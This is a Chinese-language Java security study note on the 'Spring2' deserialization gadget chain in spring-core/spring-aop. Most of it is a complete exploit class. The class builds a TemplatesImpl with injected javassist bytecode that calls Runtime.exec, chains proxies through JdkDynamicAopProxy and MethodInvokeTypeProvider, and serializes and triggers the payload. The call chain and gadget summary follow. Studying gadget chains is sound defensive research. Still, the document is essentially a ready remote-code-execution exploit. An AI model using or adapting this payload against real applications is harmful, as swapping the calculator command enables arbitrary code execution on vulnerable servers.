# Java安全学习—Spring2链

Author: H3rmesk1t

Data: 2022.03.12

# 环境配置
配置`pom.xml`文件, 添加如下依赖:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-beans</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
</dependencies>
```

# 前置知识
`Spring2`链在`Spring1`链的触发链上替换了`spring-beans`的`ObjectFactoryDelegatingInvocationHandler`, 使用了`spring-aop`的`JdkDynamicAopProxy`, 并完成了后续触发`TemplatesImpl`的流程.

## JdkDynamicAopProxy
`org.springframework.aop.framework.JdkDynamicAopProxy`类是`Spring AOP`框架基于`JDK`动态代理的实现, 同时其还实现了`AopProxy`接口.

跟进`JdkDynamicAopProxy#invoke`方法, 获取`AdvisedSupport`里的`TargetSource`, 并调用`getTarget`方法返回其中的对象.

<div align=center><img src="./images/1.png"></div>

会调用`AopUtils#invokeJoinpointUsingReflection`方法反射调用对象的`method`方法并返回. 因此`JdkDynamicAopProxy`这个`InvocationHandler`类可以完成对`TemplatesImpl`对象的调用, 后续直接配合`Spring1`中的触发调用链即可.

<div align=center><img src="./images/2.png"></div>

# EXP

```java
package org.h3rmesk1t;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import jdk.internal.org.objectweb.asm.commons.AdviceAdapter;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 8:38 下午
 */
public class Spring2Exploit {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static Object templatesImpl() throws Exception {

        // 生成恶意的 bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Spring1Exploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // 实例化类并设置属性
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        return templatesImpl;
    }

    public static void main(String[] args) throws Exception {

        // 实例化 AdvisedSupport
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl());

        // 使用 AnnotationInvocationHandler 动态代理
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl
        // 并且会调用 method.invoke(返回值, args)
        // 此时返回值被我们使用动态代理改为了 TemplatesImpl
        // 接下来需要 method 是 newTransformer(), 就可以触发调用链了
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> aopConstructor = clazz.getDeclaredConstructors()[0];
        aopConstructor.setAccessible(true);

        // 使用 AdvisedSupport 实例化 JdkDynamicAopProxy
        InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(advisedSupport);

        // JdkDynamicAopProxy 本身就是个 InvocationHandler
        // 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法
        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
        // 这样这个代理类同时拥有两个类的方法, 既能被强转为 TypeProvider.getType() 的返回值, 又可以在其中找到 newTransformer 方法
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, aopProxy);

        // 接下来代理 TypeProvider 的 getType() 方法, 使其返回我们创建的 typeTemplateProxy 代理类
        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("getType", typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法, 使其返回 typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);

        // 初始化 MethodInvokeTypeProvider
        Class<?> clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // 由于 MethodInvokeTypeProvider 初始化时会立即调用 ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method, methodName 使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        setFieldValue(objects, "methodName", "newTransformer");

        // 生成 exp
        String exp = serialize(objects);
        System.out.println(exp);
        // 触发 exp
        unserialize(exp);
    }
}
```

<div align=center><img src="./images/3.png"></div>

# 调用链
```java
SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
	    AnnotationInvocationHandler.invoke()
		    ReflectionUtils.invokeMethod()
			    Templates(Proxy).newTransformer()
				    JdkDynamicAopProxy.invoke()
                        AopUtils.invokeJoinpointUsingReflection()
						    TemplatesImpl.newTransformer()
```

# 总结
## 利用说明
使用`JdkDynamicAopProxy`替换`ObjectFactoryDelegatingInvocationHandler`, 并结合`Spring1`链完成最终的调用链.

## Gadget
 - kick-off gadget: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject
 - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
 - chain gadget: org.springframework.aop.framework.JdkDynamicAopProxy#invoke